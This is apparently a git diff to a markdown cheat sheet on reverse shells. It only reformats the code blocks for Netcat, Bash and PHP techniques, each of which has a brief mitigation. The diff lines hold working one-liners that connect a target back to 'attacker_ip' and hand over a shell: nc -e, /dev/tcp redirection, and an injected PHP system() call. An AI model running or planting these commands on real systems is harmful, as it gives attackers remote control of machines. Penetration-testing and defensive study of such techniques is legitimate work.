@@ -16,17 +16,17 @@ A reverse shell is a type of shell in which the target machine connects back to 
    - **Description:** Uses Netcat, a simple networking utility, to create a reverse shell.
    - **Exploitation:**
      - **Listener (Attacker Machine):**
-     ```sh
-     nc -lvnp 4444
-     ```
+		```sh
+nc -lvnp 4444
+```
      - **Target Machine (Linux):**
      ```sh
-     nc -e /bin/bash attacker_ip 4444
-     ```
+nc -e /bin/bash attacker_ip 4444
+```
      - **Target Machine (Windows):**
      ```sh
-     nc.exe -e cmd.exe attacker_ip 4444
-     ```
+nc.exe -e cmd.exe attacker_ip 4444
+```
    - **Mitigation:** Monitor for unauthorized outbound connections and block unneeded ports with a firewall.
 
 ### 2. **Bash Reverse Shell**
@@ -34,12 +34,12 @@ A reverse shell is a type of shell in which the target machine connects back to 
    - **Exploitation:**
      - **Listener (Attacker Machine):**
      ```sh
-     nc -lvnp 4444
-     ```
+nc -lvnp 4444
+```
      - **Target Machine:**
      ```sh
-     bash -i >& /dev/tcp/attacker_ip/4444 0>&1
-     ```
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+```
    - **Mitigation:** Restrict the execution of bash scripts and monitor for abnormal outbound traffic.
 
 ### 3. **PHP Reverse Shell**
@@ -47,12 +47,12 @@ A reverse shell is a type of shell in which the target machine connects back to 
    - **Exploitation:**
      - **Listener (Attacker Machine):**
      ```sh
-     nc -lvnp 4444
-     ```
+nc -lvnp 4444
+```
      - **Target Machine (Inject PHP Code):**
      ```php
      <?php system("nc -e /bin/bash attacker_ip 4444"); ?>
-     ```
+```
    - **Mitigation:** Disable dangerous PHP functions like `system()`, `exec()`, and `shell_exec()`, and use web application firewalls (WAFs).
 
 ### 4. **Python Reverse Shell**
